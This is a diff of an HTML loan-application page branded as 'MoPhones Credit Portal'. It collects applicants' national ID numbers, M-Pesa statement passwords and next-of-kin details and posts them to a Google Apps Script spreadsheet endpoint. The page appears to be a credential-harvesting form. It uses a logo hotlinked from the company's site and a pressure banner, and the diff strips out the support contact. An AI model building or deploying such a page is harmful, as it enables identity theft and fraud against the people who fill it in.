@@ -3,52 +3,44 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MoPhones Credit Pre-Qualification</title>
+    <title>MoPhones Credit Portal</title>
     <style>
-        :root { --primary: #004488; --accent: #25d366; --error: #dc2626; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #f1f5f9; margin: 0; padding: 15px; }
-        .container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); max-width: 500px; margin: auto; }
-        .logo { text-align: center; margin-bottom: 20px; }
-        h2 { color: var(--primary); text-align: center; font-size: 1.5em; margin-bottom: 15px; }
-        .card { background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 15px; margin-bottom: 20px; font-size: 0.9em; }
-        .disclaimer { border-left: 5px solid var(--error); background: #fff1f2; }
-        label { display: block; margin-top: 18px; font-weight: 700; color: #1e293b; font-size: 0.95em; }
-        input, select { width: 100%; padding: 14px; margin-top: 6px; border: 2px solid #e2e8f0; border-radius: 10px; box-sizing: border-box; font-size: 16px; outline: none; }
-        .btn-submit { background: var(--primary); color: white; padding: 18px; margin-top: 25px; border: none; border-radius: 10px; cursor: pointer; width: 100%; font-size: 1.1em; font-weight: 800; }
-        .btn-submit:disabled { background: #94a3b8; }
-        .whatsapp-footer { display: flex; align-items: center; justify-content: center; background: var(--accent); color: white; text-decoration: none; padding: 15px; border-radius: 10px; margin-top: 15px; font-weight: bold; }
-        #loader { display: none; text-align: center; padding: 10px; color: var(--primary); font-weight: bold; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        :root { --primary: #004488; --danger: #dc2626; }
+        body { font-family: sans-serif; background-color: #f1f5f9; padding: 15px; margin: 0; }
+        .container { background: white; padding: 20px; border-radius: 15px; max-width: 450px; margin: auto; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        .header { text-align: center; margin-bottom: 20px; }
+        .strict-banner { background: #fee2e2; border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 8px; font-size: 0.85em; font-weight: bold; margin-bottom: 20px; text-align: center; }
+        label { display: block; margin-top: 15px; font-weight: bold; font-size: 0.9em; }
+        input, select { width: 100%; padding: 12px; margin-top: 5px; border: 1px solid #cbd5e1; border-radius: 8px; box-sizing: border-box; font-size: 16px; }
+        .btn-submit { background: var(--primary); color: white; padding: 18px; border: none; border-radius: 8px; width: 100%; margin-top: 25px; font-weight: bold; font-size: 1.1em; cursor: pointer; }
+        .footer { font-size: 0.7em; text-align: center; color: #94a3b8; margin-top: 20px; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="logo">
-        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" alt="MoPhones" style="width: 140px;">
+    <div class="header">
+        <img src="https://mophones.co/cdn/shop/files/MO-Logo-01_160x.png?v=1691582743" width="120">
     </div>
 
-    <h2>Credit Pre-Qualification</h2>
-    
-    <div class="card disclaimer">
-        🤝 <b>Honesty Policy:</b><br>
-        We disqualify for dishonesty. Please provide 3 names strictly as they appear on your National ID.
+    <div class="strict-banner">
+        🚨 VALIDATION ACTIVE<br>
+        Inaccurate data leads to automatic rejection.
     </div>
 
-    <form name="submit-to-google-sheet" id="portalForm">
-        <label>Preferred Phone Model</label>
-        <input type="text" name="preferred_phone" id="phoneInput" placeholder="e.g. Samsung A15 or iPhone 13" required>
+    <form id="ironCladPortal">
+        <label>Phone Model</label>
+        <input type="text" name="preferred_phone" placeholder="e.g. Samsung A15" required>
 
-        <label>Full Name (3 Names as per ID)</label>
-        <input type="text" name="full_name" required>
+        <label>Full Name (Must be 3 Names)</label>
+        <input type="text" name="full_name" id="nameInput" placeholder="First Middle Surname" required>
 
         <label>National ID Number</label>
-        <input type="text" name="id_number" id="idInput" maxlength="8" required>
+        <input type="text" name="id_number" id="idInput" maxlength="8" minlength="7" placeholder="7-8 Digits" required>
 
-        <label>Region of Residence</label>
+        <label>Region</label>
         <select name="region" required>
-            <option value="" disabled selected>Select location</option>
+            <option value="">-- Select --</option>
             <option value="Nairobi">Nairobi</option>
             <option value="Kiambu">Kiambu</option>
             <option value="Nakuru">Nakuru</option>
@@ -56,56 +48,73 @@
             <option value="Kajiado">Kajiado</option>
         </select>
 
-        <h3>Next of Kin</h3>
-        <input type="text" name="nok_name" placeholder="Full Name" required>
-        <input type="text" name="nok_id" placeholder="ID Number" required>
-        <input type="text" name="nok_contact" value="+254" required>
-
-        <h3>Documents & Security</h3>
         <label>M-Pesa Statement Password</label>
-        <input type="text" name="mpesa_password" placeholder="Statement Password" required>
-        
-        <p style="font-size: 0.8em; color: #64748b; margin-top: 10px;">Note: You will be asked to present your physical ID and M-Pesa statement during the verification call.</p>
+        <input type="text" name="mpesa_password" id="passInput" placeholder="6-8 Characters" required>
 
-        <div id="loader"><div class="spinner"></div> Submitting...</div>
-        <button type="submit" class="btn-submit" id="submitBtn">Submit Application</button>
+        <label>Next of Kin Name</label>
+        <input type="text" name="nok_name" required>
+
+        <label>Next of Kin ID</label>
+        <input type="text" name="nok_id" minlength="7" maxlength="8" required>
+
+        <label>Next of Kin Contact</label>
+        <input type="text" name="nok_contact" id="kinContact" value="+254" minlength="13" maxlength="13" required>
+
+        <button type="submit" class="btn-submit" id="submitBtn">Verify & Submit</button>
     </form>
-
-    <a href="https://wa.me/254112384099" class="whatsapp-footer">
-        💬 Chat with Support (+254112384099)
-    </a>
+    <div class="footer">Portal Code: jeez</div>
 </div>
 
 <script>
-// YOUR FINAL AUTHORIZED URL
 const scriptURL = 'https://script.google.com/macros/s/AKfycbxp7myPK3OX047HwHab0T2uALSXNhb0GyylupoBU8e8i3bMhRDOt8xJcX29idZ05M-U/exec';
-const form = document.forms['submit-to-google-sheet'];
+const form = document.getElementById('ironCladPortal');
 
 form.addEventListener('submit', e => {
     e.preventDefault();
-    
-    // Simple Validation
-    const idVal = document.getElementById('idInput').value;
-    if (idVal.length < 7) {
-        alert("❌ Error: Please enter a valid National ID number.");
+
+    // 1. STRICT NAME CHECK (3 WORDS)
+    const nameValue = document.getElementById('nameInput').value.trim();
+    if (nameValue.split(/\s+/).length < 3) {
+        alert("❌ ERROR: You must provide exactly 3 names as they appear on your ID.");
+        return;
+    }
+
+    // 2. STRICT ID CHECK (7-8 DIGITS)
+    const idValue = document.getElementById('idInput').value;
+    if (!/^\d{7,8}$/.test(idValue)) {
+        alert("❌ ERROR: ID Number must be between 7 and 8 digits.");
+        return;
+    }
+
+    // 3. MPESA PASSWORD CHECK (6-8 CHARS)
+    const passValue = document.getElementById('passInput').value;
+    if (passValue.length < 6 || passValue.length > 8) {
+        alert("❌ ERROR: M-Pesa Statement Password is typically 7-8 digits.");
+        return;
+    }
+
+    // 4. NEXT OF KIN CONTACT (+254 CHECK)
+    const kinContact = document.getElementById('kinContact').value;
+    if (!kinContact.startsWith("+254") || kinContact.length !== 13) {
+        alert("❌ ERROR: Kin contact must be in format +2547XXXXXXXX");
         return;
     }
 
     document.getElementById('submitBtn').disabled = true;
-    document.getElementById('loader').style.display = 'block';
+    document.getElementById('submitBtn').innerText = "Authenticating...";
 
-    fetch(scriptURL, { method: 'POST', body: new FormData(form) })
-    .then(response => {
-        alert("✅ SUCCESS! Your application has been received. Our team will call you shortly.");
-        form.reset();
-        window.location.reload(); 
-    })
-    .catch(error => {
-        alert("❌ System busy. Please try again or contact support.");
-        document.getElementById('submitBtn').disabled = false;
-        document.getElementById('loader').style.display = 'none';
-    });
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => {
+          alert("✅ SUCCESS: Application stored for manual review.");
+          form.reset();
+          window.location.reload();
+      })
+      .catch(error => {
+          alert("Network Error. Try again.");
+          document.getElementById('submitBtn').disabled = false;
+      });
 });
 </script>
+
 </body>
 </html>
